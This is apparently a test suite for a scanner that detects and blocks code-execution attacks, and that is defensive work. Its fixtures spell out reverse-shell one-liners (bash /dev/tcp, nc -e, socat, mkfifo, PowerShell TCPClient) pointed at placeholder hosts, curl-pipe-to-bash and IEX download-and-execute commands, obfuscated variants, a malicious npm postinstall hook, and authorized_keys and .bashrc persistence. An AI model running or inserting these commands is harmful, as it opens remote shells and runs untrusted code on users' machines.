import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { detectCodeExec } from '../src/safety/scanner/codeexec.js';
import { riskyPath, isDocPath } from '../src/safety/scanner/codeexec.js';
import { decideCodeExec } from '../src/safety/scanner/codeexec.js';
import type { ExecContext } from '../src/safety/scanner/codeexec.js';


describe('detectCodeExec — raw patterns', () => {
  const has = (text: string, category: string, label?: string) =>
    detectCodeExec(text).some(m => m.category === category && (!label || m.label === label));

  it('flags bash reverse shell via /dev/tcp', () => {
    assert.ok(has('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'reverse_shell', 'dev_tcp'));
  });
  it('flags nc -e reverse shell', () => {
    assert.ok(has('nc -e /bin/sh attacker 4444', 'reverse_shell', 'nc_exec'));
  });
  it('flags python socket reverse shell', () => {
    assert.ok(has('import socket,subprocess,os;s=socket.socket();subprocess.call(["/bin/sh","-i"])', 'reverse_shell'));
  });
  it('flags powershell TCPClient', () => {
    assert.ok(has('$c=New-Object System.Net.Sockets.TCPClient("h",4444)', 'reverse_shell', 'powershell_tcpclient'));
  });
  it('flags curl pipe to bash as download_and_execute (contextual)', () => {
    const m = detectCodeExec('curl -s http://x/i.sh | bash');
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'contextual'));
  });
  it('flags bash <(curl ...) as weapon', () => {
    const m = detectCodeExec('bash <(curl http://x/p.sh)');
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'weapon'));
  });
  it('flags powershell IEX download as weapon', () => {
    const m = detectCodeExec("IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')");
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'weapon'));
  });
  it('flags npm postinstall hook', () => {
    assert.ok(has('{"scripts":{"postinstall":"curl -s http://x/i.sh | bash"}}', 'package_lifecycle_exec', 'npm_install_hook'));
  });
  it('flags authorized_keys append as persistence', () => {
    assert.ok(has('echo key >> ~/.ssh/authorized_keys', 'persistence', 'authorized_keys_append'));
  });
  it('does NOT flag a benign export function', () => {
    assert.equal(detectCodeExec('export function add(a,b){return a+b}').length, 0);
  });
  it('does NOT flag a plain curl with no pipe-to-shell', () => {
    assert.equal(detectCodeExec('RUN apt-get install -y curl').length, 0);
  });
  it('reverse_shell patterns carry tier weapon', () => {
    assert.ok(detectCodeExec('cat /dev/tcp/1.2.3.4/4444').every(m =>
      m.category !== 'reverse_shell' || m.tier === 'weapon'));
  });
});

describe('detectCodeExec — decoded variants', () => {
  it('flags a hex-escaped /dev/tcp payload', () => {
    // "/dev/tcp/1.2.3.4/4444" with the leading slash hex-escaped
    const text = 'bash -i >& \\x2fdev/tcp/1.2.3.4/4444 0>&1';
    assert.ok(detectCodeExec(text).some(m => m.category === 'reverse_shell'));
  });
  it('flags curl|bash hidden in a base64 blob (eval(atob(...)))', () => {
    const inner = Buffer.from('curl http://x/i.sh | bash').toString('base64');
    const text = `eval(atob('${inner}'))`;
    assert.ok(detectCodeExec(text).some(m => m.category === 'download_and_execute'));
  });
  it('catches curl|bash split across a line continuation', () => {
    const text = 'curl -s http://x/i.sh \\\n| bash';
    assert.ok(detectCodeExec(text).some(m => m.category === 'download_and_execute'));
  });
});

describe('detectCodeExec — additional pattern coverage', () => {
  it('flags mkfifo reverse shell', () => {
    assert.ok(detectCodeExec('mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f').some(m => m.category === 'reverse_shell'));
  });
  it('flags socat exec reverse shell', () => {
    assert.ok(detectCodeExec('socat tcp-connect:1.2.3.4:4444 exec:/bin/sh').some(m => m.category === 'reverse_shell'));
  });
  it('flags perl reverse shell', () => {
    assert.ok(detectCodeExec("perl -e 'use Socket;socket(S,...);exec(\"/bin/sh\");'").some(m => m.category === 'reverse_shell'));
  });
  it('flags go:generate exec', () => {
    assert.ok(detectCodeExec('//go:generate bash -c "curl http://x | sh"').some(m => m.category === 'package_lifecycle_exec'));
  });
  it('flags build.rs Command exec', () => {
    assert.ok(detectCodeExec('Command::new("bash").arg("-c").arg("curl http://x")').some(m => m.category === 'package_lifecycle_exec'));
  });
  it('flags shell-rc append as persistence', () => {
    assert.ok(detectCodeExec('echo "evil" >> ~/.bashrc').some(m => m.category === 'persistence'));
  });
});

describe('riskyPath', () => {
  for (const p of ['.git/hooks/pre-commit', 'package.json', '.envrc', 'setup.py',
                   'build.rs', '.github/workflows/ci.yml', 'Dockerfile', 'Makefile',
                   'src/proj/.git/hooks/post-merge', '/home/u/.bashrc',
                   '.vscode/tasks.json', '/etc/cron.d/myjob', 'crontab']) {
    it(`marks ${p} executes-on-host`, () => assert.equal(riskyPath(p).executesOnHost, true));
  }
  for (const p of ['README.md', 'src/index.ts', 'docs/guide.md', 'data.csv']) {
    it(`does NOT mark ${p} executes-on-host`, () => assert.equal(riskyPath(p).executesOnHost, false));
  }
  it('returns false for undefined path', () => assert.equal(riskyPath(undefined).executesOnHost, false));
});

describe('isDocPath', () => {
  it('treats README.md as doc', () => assert.equal(isDocPath('README.md'), true));
  it('treats docs/guide.md as doc', () => assert.equal(isDocPath('docs/guide.md'), true));
  it('treats markdown mime (no path) as doc', () => assert.equal(isDocPath(undefined, 'text/markdown'), true));
  it('does NOT treat text/plain (no path) as doc', () => assert.equal(isDocPath(undefined, 'text/plain'), false));
  it('does NOT treat .git/hooks path as doc', () => assert.equal(isDocPath('.git/hooks/pre-commit'), false));
});

describe('decideCodeExec', () => {
  const d = (text: string, ctx?: ExecContext, mime?: string) =>
    decideCodeExec(detectCodeExec(text), ctx, mime);

  it('no matches → allow', () => {
    const r = d('export function add(a,b){return a+b}');
    assert.equal(r.action, 'allow');
    assert.equal(r.flags.length, 0);
    assert.equal(r.warnings.length, 0);
  });
  it('weapon → block regardless of context', () => {
    const r = d('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1');
    assert.equal(r.action, 'block');
    assert.ok(r.flags.some(f => f.startsWith('code:reverse_shell:')));
    assert.ok(r.score >= 0.9);
  });
  it('contextual + no context → warn', () => {
    const r = d('curl -s http://x/i.sh | bash');
    assert.equal(r.action, 'warn');
    assert.ok(r.warnings.some(f => f.startsWith('code:download_and_execute:')));
    assert.equal(r.flags.length, 0);
  });
  it('contextual + executes-on-host path → block', () => {
    const r = d('curl -s http://x/i.sh | bash', { path: '.git/hooks/pre-commit' });
    assert.equal(r.action, 'block');
    assert.ok(r.flags.some(f => f.startsWith('code:download_and_execute:')));
  });
  it('contextual + caller executes_on_host flag → block', () => {
    const r = d('{"scripts":{"postinstall":"curl -s http://x | bash"}}', { executes_on_host: true });
    assert.equal(r.action, 'block');
  });
  it('contextual + doc path → allow (suppressed)', () => {
    const r = d('curl https://get.example.com | bash', { path: 'README.md' });
    assert.equal(r.action, 'allow');
    assert.equal(r.flags.length, 0);
    assert.equal(r.warnings.length, 0);
  });
  it('strongest action wins across matches', () => {
    // contextual curl|bash (warn) + weapon nc -e (block) → block
    const r = d('curl http://x | bash\nnc -e /bin/sh h 4444');
    assert.equal(r.action, 'block');
  });
  it('weapon in a doc path still blocks (doc suppression is contextual-only)', () => {
    const r = decideCodeExec(detectCodeExec('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'), { path: 'README.md' });
    assert.equal(r.action, 'block');
  });
  it('executes_on_host:false does NOT suppress a server-detected risky path', () => {
    const r = d('curl -s http://x/i.sh | bash', { path: '.git/hooks/pre-commit', executes_on_host: false });
    assert.equal(r.action, 'block');
  });
  it('executes_on_host:true escalates even with a neutral path', () => {
    const r = d('curl -s http://x/i.sh | bash', { executes_on_host: true });
    assert.equal(r.action, 'block');
  });
  it('authorized_keys append warns (not blocks) with no execution context', () => {
    const r = d('echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys');
    assert.equal(r.action, 'warn');
  });
});
